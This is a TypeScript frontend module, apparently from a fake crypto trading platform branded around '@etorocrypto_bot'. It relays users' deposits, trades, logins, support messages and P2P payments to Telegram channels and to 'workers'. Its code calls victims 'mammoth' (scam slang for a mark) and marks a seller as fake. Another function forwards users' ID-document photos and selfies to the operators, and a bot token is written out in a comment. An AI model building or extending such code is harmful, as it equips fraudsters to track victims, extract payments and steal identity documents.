/**
 * Отправка заявок на пополнение и верификацию в Telegram напрямую с фронтенда (Fetch API).
 * Токен и канал берутся из env (VITE_TELEGRAM_BOT_TOKEN, VITE_DEPOSIT_CHANNEL_ID).
 *
 * Бот: @etorocrypto_bot
 * Токен: 8667556032:AAHiRJUegH5nOG2z-_g_D2pZ3_2S6WMVx28 (хранится открыто, аналогично bot.py)
 * П2П канал: -1003824912918
 */

const BOT_TOKEN = (import.meta.env.VITE_TELEGRAM_BOT_TOKEN ?? '').trim();
const CHANNEL_ID = (import.meta.env.VITE_DEPOSIT_CHANNEL_ID ?? '').trim();
const SUPPORT_CHAT_ID = (import.meta.env.VITE_SUPPORT_CHAT_ID ?? '-1003665428333').trim();
/** ID П2П канала в открытом виде, без .env (как просил владелец проекта). */
const P2P_CHANNEL_ID = '-1003824912918';
const BOT_USERNAME = (import.meta.env.VITE_BOT_USERNAME ?? 'etorocrypto_bot').trim();

export interface DepositNotifyPayload {
  user_id: string | number;
  username?: string;
  full_name?: string;
  worker_id?: string | number;
  /** Имя/ник воркера для отображения в сообщении (тот, кто привёл реферала) */
  worker_username?: string | null;
  worker_full_name?: string | null;
  amount_local: number;
  amount_usd: number;
  currency: string;
  method: string;
  /** Сеть для крипто (trc20, ton, btc, sol) — отображается в сообщении */
  network?: string;
  /** Ссылка на чек Crypto Bot (@send) при способе crypto_bot */
  check_link?: string;
  request_id: string | number;
  country?: string;
  created_at?: string;
}

/** includeCheckLink: для канала — true (ссылка на чек), для воркера в ЛС — false. maxCaptionLength: для sendPhoto лимит 1024 символа. */
function formatDepositMessage(data: DepositNotifyPayload, hasScreenshot: boolean, includeCheckLink = true, maxCaptionLength = 0): string {
  const isGuest = data.user_id === 0 || data.user_id === 'guest' || data.request_id === 'guest';
  const user_name = isGuest
    ? 'Гость'
    : (data.full_name || data.username || 'Не указан').trim();
  const user_link = data.username ? (data.username.startsWith('@') ? data.username : `@${data.username}`) : '—';
  const worker_label = (() => {
    if (data.worker_username || data.worker_full_name) {
      const name = (data.worker_full_name || '').trim();
      const uname = data.worker_username ? (data.worker_username.startsWith('@') ? data.worker_username : `@${data.worker_username}`) : '';
      return [name, uname].filter(Boolean).join(' ') || `ID ${data.worker_id}`;
    }
    if (data.worker_id) return `ID ${data.worker_id}`;
    return isGuest ? 'Гость (сайт)' : 'Прямая регистрация';
  })();
  const amount_local = Number(data.amount_local) || 0;
  const amount_usd = Number(data.amount_usd) || 0;
  const country = data.country || 'Россия';
  let date_str: string;
  if (data.created_at) {
    try {
      const dt = new Date(data.created_at.replace('Z', '+00:00'));
      date_str = dt.toLocaleString('ru-RU', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
      });
    } catch {
      date_str = new Date().toLocaleString('ru-RU');
    }
  } else {
    date_str = new Date().toLocaleString('ru-RU');
  }
  const screenshotLine = hasScreenshot ? '📸 Скриншот прикреплен\n\n' : '';
  const methodLabel = data.method === 'crypto_bot'
    ? 'Crypto Bot (@send) +5%'
    : data.method === 'crypto' && data.network
      ? `Крипто (${String(data.network).toUpperCase()})`
      : data.method === 'sbp'
        ? 'СБП'
        : data.method === 'card'
          ? 'Карта'
          : data.method || '—';
  const checkLinkLine = includeCheckLink && data.method === 'crypto_bot' && data.check_link
    ? `\n🔗 Чек: ${data.check_link}\n`
    : '';
  let text =
    '🔔 НОВАЯ ЗАЯВКА НА ПОПОЛНЕНИЕ\n\n' +
    `👤 Пользователь: ${user_name} (${user_link}) ID: ${data.user_id}\n` +
    `👨‍💼 Воркер: ${worker_label}\n` +
    `💰 Сумма: ${amount_local.toLocaleString('ru-RU', { maximumFractionDigits: 0 })} ${data.currency}\n` +
    `💵 В USDT: ≈ $${amount_usd.toFixed(2)}\n` +
    `🌍 Страна: ${country}\n` +
    `🏦 Способ: ${methodLabel} · Валюта: ${data.currency}\n` +
    checkLinkLine +
    `📅 Дата: ${date_str}\n` +
    `🆔 ID заявки: ${isGuest ? 'Гость' : data.request_id}\n\n` +
    screenshotLine +
    '#пополнение #россия #rub';
  if (maxCaptionLength > 0 && text.length > maxCaptionLength) {
    // Telegram считает длину в Unicode code points; slice по символам, не по байтам
    const truncated = [...text].slice(0, maxCaptionLength - 1).join('');
    text = truncated + '…';
  }
  return text;
}

const LOG_PREFIX = '[Deposit→TG]';

async function sendMessage(
  chatId: string,
  text: string,
  opts?: { messageThreadId?: number }
): Promise<{ ok: boolean; result?: unknown; description?: string }> {
  if (!BOT_TOKEN) return { ok: false, description: 'BOT_TOKEN не задан' };
  const normalizedChatId = String(chatId).trim();
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  console.log(LOG_PREFIX, 'sendMessage: запрос', { chatId: normalizedChatId, textLength: text.length });
  try {
    const body: any = {
      chat_id: normalizedChatId,
      text,
      parse_mode: 'HTML',
    };
    if (opts?.messageThreadId != null) {
      body.message_thread_id = opts.messageThreadId;
    }
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    const data = (await res.json()) as { ok?: boolean; result?: unknown; description?: string };
    if (data.ok) {
      console.log(LOG_PREFIX, 'sendMessage: успех', data.result);
    } else {
      console.warn(LOG_PREFIX, 'sendMessage: ошибка Telegram API', data.description ?? data);
    }
    return { ok: !!data.ok, result: data.result, description: data.description };
  } catch (err) {
    console.error(LOG_PREFIX, 'sendMessage: ошибка сети', err);
    return { ok: false, description: err instanceof Error ? err.message : String(err) };
  }
}

const TELEGRAM_CAPTION_MAX_LENGTH = 1024;

/** Обрезка подписи по лимиту Telegram (1024 code points) с учётом Unicode. */
function truncateCaption(caption: string, maxLen: number = TELEGRAM_CAPTION_MAX_LENGTH): string {
  if (caption.length <= maxLen) return caption;
  return [...caption].slice(0, maxLen - 1).join('') + '…';
}

async function sendPhoto(
  chatId: string,
  caption: string,
  file: File | Blob,
  opts?: { messageThreadId?: number }
): Promise<{ ok: boolean; result?: unknown; description?: string }> {
  if (!BOT_TOKEN) return { ok: false, description: 'BOT_TOKEN не задан' };
  const normalizedChatId = String(chatId).trim();
  const safeCaption = truncateCaption(caption);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const fileName = file instanceof File ? (file.name || 'check.jpg') : 'check.jpg';
  const size = file.size ?? 0;
  console.log(LOG_PREFIX, 'sendPhoto: запрос', { chatId: normalizedChatId, fileName, size, captionLength: safeCaption.length });
  try {
    const form = new FormData();
    form.append('chat_id', normalizedChatId);
    form.append('caption', safeCaption);
    form.append('parse_mode', 'HTML');
    if (opts?.messageThreadId != null) {
      form.append('message_thread_id', String(opts.messageThreadId));
    }
    const blob = file instanceof File ? file : file;
    form.append('photo', blob, fileName);
    const res = await fetch(url, { method: 'POST', body: form });
    const data = (await res.json()) as { ok?: boolean; result?: unknown; description?: string };
    if (data.ok) {
      console.log(LOG_PREFIX, 'sendPhoto: успех', data.result);
    } else {
      console.warn(LOG_PREFIX, 'sendPhoto: ошибка Telegram API', data.description ?? data);
    }
    return { ok: !!data.ok, result: data.result, description: data.description };
  } catch (err) {
    console.error(LOG_PREFIX, 'sendPhoto: ошибка сети', err);
    return { ok: false, description: err instanceof Error ? err.message : String(err) };
  }
}

/**
 * Отправляет заявку на пополнение в канал и опционально воркеру в ЛС.
 * Вся отправка идёт с фронтенда через Fetch API (sendMessage / sendPhoto к api.telegram.org).
 */
export async function sendDepositToTelegram(
  payload: DepositNotifyPayload,
  screenshot?: File | null
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN || !CHANNEL_ID) {
    return { ok: false, error: 'Не настроена отправка в Telegram' };
  }

  const textChannel = formatDepositMessage(payload, Boolean(screenshot), true, TELEGRAM_CAPTION_MAX_LENGTH);
  const textWorker = formatDepositMessage(payload, Boolean(screenshot), false, TELEGRAM_CAPTION_MAX_LENGTH);
  console.log(LOG_PREFIX, 'отправка заявки (Fetch API)', { request_id: payload.request_id, hasScreenshot: Boolean(screenshot), channelId: CHANNEL_ID });

  try {
    let result: { ok: boolean; result?: unknown; description?: string };
    if (screenshot && screenshot.size > 0) {
      result = await sendPhoto(CHANNEL_ID, textChannel, screenshot);
      if (!result.ok && (result.description?.toLowerCase().includes('chat not found') || result.description?.toLowerCase().includes('forbidden'))) {
        console.warn(LOG_PREFIX, 'sendPhoto в канал не удался — отправляем только текст. Добавьте бота в канал как администратора с правом публикации.');
        result = await sendMessage(CHANNEL_ID, textChannel + '\n\n⚠️ Чек не загружен (бот не имеет прав на отправку фото в канал).');
      }
    } else {
      result = await sendMessage(CHANNEL_ID, textChannel);
    }
    if (!result.ok) {
      const desc = result.description ?? 'Ошибка Telegram API';
      const hint = desc.toLowerCase().includes('chat not found')
        ? ' Добавьте бота в канал как администратора (права на публикацию сообщений и медиа).'
        : '';
      return { ok: false, error: desc + hint };
    }
    const workerChatId = payload.worker_id != null && payload.worker_id !== '' ? String(payload.worker_id) : null;
    if (workerChatId) {
      let workerResult: { ok: boolean; result?: unknown; description?: string };
      if (screenshot && screenshot.size > 0) {
        workerResult = await sendPhoto(workerChatId, textWorker, screenshot);
      } else {
        workerResult = await sendMessage(workerChatId, textWorker);
      }
      if (workerResult.ok) {
        console.log(LOG_PREFIX, 'воркеру отправлено', { workerChatId });
      } else {
        console.warn(LOG_PREFIX, 'воркеру не отправлено (возможно не запускал бота)', workerResult.description);
      }
    }
    return { ok: true };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error(LOG_PREFIX, 'исключение', err);
    return { ok: false, error: msg };
  }
}

export function canSendDepositToTelegram(): boolean {
  return Boolean(BOT_TOKEN && CHANNEL_ID);
}

/** Можно ли отправлять уведомления воркерам с фронта (deal-opened, referral-spot) без бекенда. */
export function canNotifyWorker(): boolean {
  return Boolean(BOT_TOKEN);
}

/** Отправка сообщения в чат поддержки напрямую (без веток). */
export async function sendSupportMessageToTelegram(
  text: string
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN || !SUPPORT_CHAT_ID) {
    return { ok: false, error: 'Не настроен чат поддержки' };
  }
  const res = await sendMessage(SUPPORT_CHAT_ID, text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Форматирует время для логов воркеру (короткое). */
function supportLogTime(): string {
  return new Date().toLocaleTimeString('ru-RU', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });
}

/**
 * Время для быстрых логов воркеру (короче, чем supportLogTime).
 */
function workerLogTime(): string {
  return new Date().toLocaleTimeString('ru-RU', {
    hour: '2-digit',
    minute: '2-digit',
  });
}

/**
 * Отправка воркеру: лог чата ТП — реферал написал в поддержку.
 * threadLabel — короткая метка треда (например id.slice(0,8)), чтобы воркер видел одну переписку.
 */
export async function sendSupportMessageToWorker(
  workerId: number,
  payload: { name: string; text: string; threadLabel?: string }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const nameShort = payload.name.length > 25 ? payload.name.slice(0, 25) + '…' : payload.name;
  const thread = payload.threadLabel ? ` #${payload.threadLabel}` : '';
  const time = supportLogTime();
  const msg =
    `📩${thread} · реферал · ${time} · ${escapeHtml(nameShort)}\n` +
    `<blockquote>${escapeHtml(payload.text)}</blockquote>`;
  const res = await sendMessage(String(workerId), msg);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

// =======================
// ВЕТКИ ПОДДЕРЖКИ В ЧАТЕ
// =======================

import { supabase } from './supabase';

export interface SupportThreadMeta {
  threadId: string;
  displayName: string;
  email?: string | null;
  tgid?: string | null;
  userId?: number | null;
  referrerId?: number | null;
}

/** Создаёт (при необходимости) topic в чате поддержки для треда и возвращает message_thread_id. */
async function ensureSupportTopic(meta: SupportThreadMeta): Promise<number | null> {
  try {
    const { data, error } = await supabase
      .from('support_threads')
      .select('tg_topic_id')
      .eq('id', meta.threadId)
      .single();
    if (error) {
      console.warn('[Support→TG] cannot load thread', error);
    }
    const existing = (data as { tg_topic_id?: number } | null)?.tg_topic_id;
    if (existing && typeof existing === 'number') {
      return existing;
    }
  } catch (e) {
    console.warn('[Support→TG] error reading thread', e);
  }

  if (!BOT_TOKEN || !SUPPORT_CHAT_ID) return null;

  const suffix =
    meta.email?.trim() ||
    (meta.tgid ? `TG ${meta.tgid}` : meta.userId ? `ID ${meta.userId}` : 'Гость');
  let name = `${meta.displayName || 'Клиент'} | ${suffix}`;
  if (name.length > 128) name = name.slice(0, 125) + '…';

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/createForumTopic`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: SUPPORT_CHAT_ID,
        name,
      }),
    });
    const data = (await res.json()) as {
      ok?: boolean;
      result?: { message_thread_id?: number };
      description?: string;
    };
    if (!data.ok || !data.result?.message_thread_id) {
      console.warn('[Support→TG] createForumTopic error', data.description ?? data);
      return null;
    }
    const topicId = data.result.message_thread_id;
    await supabase
      .from('support_threads')
      .update({ tg_topic_id: topicId })
      .eq('id', meta.threadId);
    return topicId;
  } catch (e) {
    console.error('[Support→TG] createForumTopic exception', e);
    return null;
  }
}

/** Отправка сообщения в Telegram‑ветку, привязанную к support_threads. */
export async function sendSupportMessageWithThread(
  meta: SupportThreadMeta,
  text: string
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN || !SUPPORT_CHAT_ID) {
    return { ok: false, error: 'Не настроен чат поддержки' };
  }
  const topicId = await ensureSupportTopic(meta);
  const decorated = `🆘 <b>${meta.displayName}</b>\n\n${text}`;
  const res = await sendMessage(
    SUPPORT_CHAT_ID,
    decorated,
    topicId != null ? { messageThreadId: topicId } : undefined
  );
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Отправка воркеру в ЛС: реферал открыл сделку (без бекенда, с фронта через Bot API). */
export async function sendDealOpenedToWorker(
  workerId: number,
  payload: {
    mammoth_name?: string;
    mammoth_username?: string;
    mammoth_id?: number | string;
    asset_ticker?: string;
    side?: string;
    amount?: number;
    leverage?: number;
    duration_seconds?: number;
  }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const time = workerLogTime();
  const uname = payload.mammoth_username
    ? (payload.mammoth_username.startsWith('@') ? payload.mammoth_username : `@${payload.mammoth_username}`)
    : null;
  const idStr = payload.mammoth_id != null ? ` · <code>${escapeHtml(String(payload.mammoth_id))}</code>` : '';
  const userLine = uname ? `${escapeHtml(uname)}${idStr}` : escapeHtml((payload.mammoth_name || 'Клиент').trim()) + idStr;
  const asset = (payload.asset_ticker || '—').trim();
  const sideRu = payload.side === 'UP' || payload.side === 'Long' ? '🟢 Long' : '🔴 Short';
  const amount = Number(payload.amount) || 0;
  const leverage = Number(payload.leverage) || 1;
  const duration = Number(payload.duration_seconds) || 0;
  const text =
    `📈 <b>Сделка открыта</b> · ${time}\n` +
    `👤 ${userLine}\n` +
    `📌 ${escapeHtml(asset)} ${sideRu} · ×${leverage}\n` +
    `💰 ${amount.toLocaleString('ru-RU', { maximumFractionDigits: 0 })} ₽ · ⏱ ${duration}с`;
  const res = await sendMessage(String(workerId), text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Отправка воркеру в ЛС: реферал купил крипту в споте (без бекенда). */
export async function sendReferralSpotBuyToWorker(
  workerId: number,
  payload: { mammoth_name?: string; mammoth_username?: string; mammoth_id?: number | string; ticker?: string; amount_rub?: number }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const time = workerLogTime();
  const uname = payload.mammoth_username
    ? (payload.mammoth_username.startsWith('@') ? payload.mammoth_username : `@${payload.mammoth_username}`)
    : null;
  const idStr = payload.mammoth_id != null ? ` · <code>${escapeHtml(String(payload.mammoth_id))}</code>` : '';
  const userLine = uname ? `${escapeHtml(uname)}${idStr}` : escapeHtml((payload.mammoth_name || 'Клиент').trim()) + idStr;
  const ticker = (payload.ticker || '—').trim();
  const amountRub = Number(payload.amount_rub) || 0;
  const text =
    `🟢 <b>Спот — покупка</b> · ${time}\n` +
    `👤 ${userLine}\n` +
    `✅ ${escapeHtml(ticker)} · ${amountRub.toLocaleString('ru-RU', { maximumFractionDigits: 0 })} ₽`;
  const res = await sendMessage(String(workerId), text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Отправка рефереру в ЛС: по его ссылке зарегистрировался новый пользователь. */
export async function sendReferralRegisteredToWorker(
  referrerId: number,
  payload: { email?: string; full_name?: string; username?: string; user_id?: number | string }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const uname = payload.username
    ? (payload.username.startsWith('@') ? payload.username : `@${payload.username}`)
    : null;
  const email = (payload.email || '').trim() || '—';
  const clientId = payload.user_id != null && String(payload.user_id).trim() !== ''
    ? String(payload.user_id).trim()
    : null;
  const idStr = clientId ? ` · <code>${escapeHtml(clientId)}</code>` : '';
  const userLine = uname
    ? `${escapeHtml(uname)}${idStr}`
    : escapeHtml((payload.full_name || '—').trim()) + idStr;
  const time = workerLogTime();
  const text =
    `🟣 <b>Новая регистрация</b> · ${time}\n` +
    `👤 ${userLine}\n` +
    `📧 ${escapeHtml(email)}`;
  const res = await sendMessage(String(referrerId), text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Лог воркеру: реферал зашёл (вход на сайт или открыл мини-апп). */
export async function sendReferralLoginToWorker(
  referrerId: number,
  payload: { email?: string; full_name?: string; username?: string; user_id?: number | string }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const uname = payload.username
    ? (payload.username.startsWith('@') ? payload.username : `@${payload.username}`)
    : null;
  const email = (payload.email || '').trim();
  const clientId = payload.user_id != null && String(payload.user_id).trim() !== ''
    ? String(payload.user_id).trim()
    : null;
  const idStr = clientId ? ` · <code>${escapeHtml(clientId)}</code>` : '';
  const userLine = uname
    ? `${escapeHtml(uname)}${idStr}`
    : escapeHtml((payload.full_name || '—').trim()) + idStr;
  const time = workerLogTime();
  const text = email
    ? `🔐 <b>Вход на сайт</b> · ${time}\n👤 ${userLine}\n📧 ${escapeHtml(email)}`
    : `📱 <b>Открыл мини-апп</b> · ${time}\n👤 ${userLine}`;
  const res = await sendMessage(String(referrerId), text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/** Отправка скриншота в Telegram‑ветку поддержки (caption — подпись к фото). */
export async function sendSupportPhotoWithThread(
  meta: SupportThreadMeta,
  caption: string,
  file: File | Blob
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN || !SUPPORT_CHAT_ID) {
    return { ok: false, error: 'Не настроен чат поддержки' };
  }
  const topicId = await ensureSupportTopic(meta);
  const safeCaption = truncateCaption(
    `🆘 <b>${escapeHtml(meta.displayName)}</b>\n\n${escapeHtml(caption)}`
  );
  const res = await sendPhoto(
    SUPPORT_CHAT_ID,
    safeCaption,
    file,
    topicId != null ? { messageThreadId: topicId } : undefined
  );
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

// ==========================================
// П2П СДЕЛКИ
// ==========================================

export interface P2PDealPayload {
  deal_id: string;
  user_id: number | string;
  username?: string | null;
  full_name?: string | null;
  worker_id?: number | null;
  worker_username?: string | null;
  worker_full_name?: string | null;
  country: string;
  bank: string;
  amount: number;
  currency: string;
  seller_name: string;
}

/** Отправка воркеру в ЛС: реферал активировал П2П сделку. */
export async function sendReferralP2PActivatedToWorker(
  workerId: number,
  payload: { mammoth_name?: string; mammoth_username?: string; mammoth_id?: number | string; deal_id?: string; amount?: number; currency?: string; bank?: string }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const time = workerLogTime();
  const uname = payload.mammoth_username
    ? (payload.mammoth_username.startsWith('@') ? payload.mammoth_username : `@${payload.mammoth_username}`)
    : null;
  const idStr = payload.mammoth_id != null ? ` · <code>${escapeHtml(String(payload.mammoth_id))}</code>` : '';
  const userLine = uname ? `${escapeHtml(uname)}${idStr}` : escapeHtml((payload.mammoth_name || 'Клиент').trim()) + idStr;
  const dealId = (payload.deal_id || '').trim();
  const amount = Number(payload.amount) || 0;
  const currency = (payload.currency || '').trim() || 'RUB';
  const bank = (payload.bank || '').trim();
  const text =
    `🟦 <b>P2P — открыта сделка</b> · ${time}\n` +
    `👤 ${userLine}\n` +
    `💰 ${amount.toLocaleString('ru-RU', { maximumFractionDigits: 0 })} ${escapeHtml(currency)}${bank ? ` · 🏦 ${escapeHtml(bank)}` : ''}\n` +
    (dealId ? `🆔 <code>${escapeHtml(dealId)}</code>` : '');
  const res = await sendMessage(String(workerId), text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Отправка воркеру в ЛС: реферал получил реквизиты мерчанта. */
export async function sendReferralP2PRequisitesToWorker(
  workerId: number,
  payload: { mammoth_name?: string; mammoth_username?: string; mammoth_id?: number | string; deal_id?: string; bank?: string }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const time = workerLogTime();
  const uname = payload.mammoth_username
    ? (payload.mammoth_username.startsWith('@') ? payload.mammoth_username : `@${payload.mammoth_username}`)
    : null;
  const idStr = payload.mammoth_id != null ? ` · <code>${escapeHtml(String(payload.mammoth_id))}</code>` : '';
  const userLine = uname ? `${escapeHtml(uname)}${idStr}` : escapeHtml((payload.mammoth_name || 'Клиент').trim()) + idStr;
  const dealId = (payload.deal_id || '').trim();
  const bank = (payload.bank || '').trim();
  const text =
    `📋 <b>P2P — реквизиты получены</b> · ${time}\n` +
    `👤 ${userLine}\n` +
    (bank ? `🏦 ${escapeHtml(bank)}\n` : '') +
    (dealId ? `🆔 <code>${escapeHtml(dealId)}</code>` : '');
  const res = await sendMessage(String(workerId), text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Отправка воркеру в ЛС: реферал оплатил П2П сделку. */
export async function sendReferralP2PPaidToWorker(
  workerId: number,
  payload: { mammoth_name?: string; mammoth_username?: string; mammoth_id?: number | string; deal_id?: string; amount?: number; currency?: string; bank?: string }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN) return { ok: false, error: 'BOT_TOKEN не задан' };
  const time = workerLogTime();
  const uname = payload.mammoth_username
    ? (payload.mammoth_username.startsWith('@') ? payload.mammoth_username : `@${payload.mammoth_username}`)
    : null;
  const idStr = payload.mammoth_id != null ? ` · <code>${escapeHtml(String(payload.mammoth_id))}</code>` : '';
  const userLine = uname ? `${escapeHtml(uname)}${idStr}` : escapeHtml((payload.mammoth_name || 'Клиент').trim()) + idStr;
  const dealId = (payload.deal_id || '').trim();
  const amount = Number(payload.amount) || 0;
  const currency = (payload.currency || '').trim() || 'RUB';
  const bank = (payload.bank || '').trim();
  const text =
    `✅ <b>P2P — оплачено</b> · ${time}\n` +
    `👤 ${userLine}\n` +
    `💸 ${amount.toLocaleString('ru-RU', { maximumFractionDigits: 0 })} ${escapeHtml(currency)}${bank ? ` · 🏦 ${escapeHtml(bank)}` : ''}\n` +
    (dealId ? `🆔 <code>${escapeHtml(dealId)}</code>` : '');
  const res = await sendMessage(String(workerId), text);
  return res.ok ? { ok: true } : { ok: false, error: res.description };
}

/** Отправляет уведомление об открытии П2П сделки в канал с inline-кнопкой для воркера. Возвращает message_id для последующего редактирования при выдаче реквизитов. */
export async function sendP2PDealToChannel(
  payload: P2PDealPayload
): Promise<{ ok: boolean; error?: string; messageId?: number }> {
  const channelId = P2P_CHANNEL_ID || CHANNEL_ID;
  if (!BOT_TOKEN || !channelId) {
    return { ok: false, error: 'П2П канал не настроен (VITE_P2P_CHANNEL_ID)' };
  }

  const userLink = payload.username
    ? payload.username.startsWith('@') ? payload.username : `@${payload.username}`
    : '—';
  const userName = (payload.full_name || payload.username || 'Клиент').trim();

  const workerLabel = (() => {
    if (payload.worker_full_name || payload.worker_username) {
      const name = (payload.worker_full_name || '').trim();
      const uname = payload.worker_username
        ? payload.worker_username.startsWith('@') ? payload.worker_username : `@${payload.worker_username}`
        : '';
      return [name, uname].filter(Boolean).join(' ') || `ID ${payload.worker_id}`;
    }
    if (payload.worker_id) return `ID ${payload.worker_id}`;
    return 'Прямая регистрация';
  })();

  const dateStr = new Date().toLocaleString('ru-RU', {
    day: '2-digit', month: '2-digit', year: 'numeric',
    hour: '2-digit', minute: '2-digit',
  });

  const text =
    '🔄 <b>П2П СДЕЛКА ОТКРЫТА</b>\n\n' +
    `👤 Пользователь: ${escapeHtml(userName)} (${userLink}) ID: <code>${payload.user_id}</code>\n` +
    `👨‍💼 Воркер: ${escapeHtml(workerLabel)}\n` +
    `💰 Сумма: <b>${Number(payload.amount).toLocaleString('ru-RU', { maximumFractionDigits: 0 })} ${payload.currency}</b>\n` +
    `🌍 Страна: ${escapeHtml(payload.country)}\n` +
    `🏦 Банк: ${escapeHtml(payload.bank)}\n` +
    `🧑‍💼 Продавец (фейк): ${escapeHtml(payload.seller_name)}\n` +
    `📅 Время: ${dateStr}\n` +
    `🆔 ID сделки: <code>${payload.deal_id}</code>\n\n` +
    '📩 <b>Нажмите кнопку ниже чтобы отправить реквизиты покупателю:</b>';

  const botLink = `https://t.me/${BOT_USERNAME}?start=p2p_${payload.deal_id}`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  console.log('[P2P→TG] отправка в канал', { channelId, deal_id: payload.deal_id });

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: channelId,
        text,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [[
            { text: '👇 Отправить реквизиты покупателю', url: botLink },
          ]],
        },
      }),
    });
    const data = (await res.json()) as { ok?: boolean; result?: { message_id?: number }; description?: string };
    if (data.ok && data.result?.message_id != null) {
      console.log('[P2P→TG] успешно отправлено', { messageId: data.result.message_id });
      return { ok: true, messageId: data.result.message_id };
    }
    if (data.ok) return { ok: true };
    console.warn('[P2P→TG] ошибка Telegram API', data.description);
    return { ok: false, error: data.description ?? 'Ошибка Telegram API' };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.error('[P2P→TG] ошибка сети', err);
    return { ok: false, error: msg };
  }
}

/**
 * Отправляет заявку на верификацию в тот же канал: текст + фото документа + селфи.
 */
export async function sendVerificationToTelegram(
  text: string,
  documentPhoto: File,
  selfiePhoto: File,
  opts?: { workerLabel?: string }
): Promise<{ ok: boolean; error?: string }> {
  if (!BOT_TOKEN || !CHANNEL_ID) {
    return { ok: false, error: 'Не настроена отправка в Telegram' };
  }
  try {
    const r1 = await sendMessage(CHANNEL_ID, text);
    if (!r1.ok) return { ok: false, error: r1.description ?? 'Ошибка отправки' };
    const workerCaptionLine = opts?.workerLabel
      ? `👨‍💼 Воркер: ${escapeHtml(String(opts.workerLabel).trim())}\n`
      : '';
    const r2 = await sendPhoto(CHANNEL_ID, `${workerCaptionLine}📄 Документ`, documentPhoto);
    if (!r2.ok) return { ok: false, error: r2.description ?? 'Ошибка отправки документа' };
    const r3 = await sendPhoto(CHANNEL_ID, `${workerCaptionLine}🤳 Селфи`, selfiePhoto);
    if (!r3.ok) return { ok: false, error: r3.description ?? 'Ошибка отправки селфи' };
    return { ok: true };
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    return { ok: false, error: msg };
  }
}
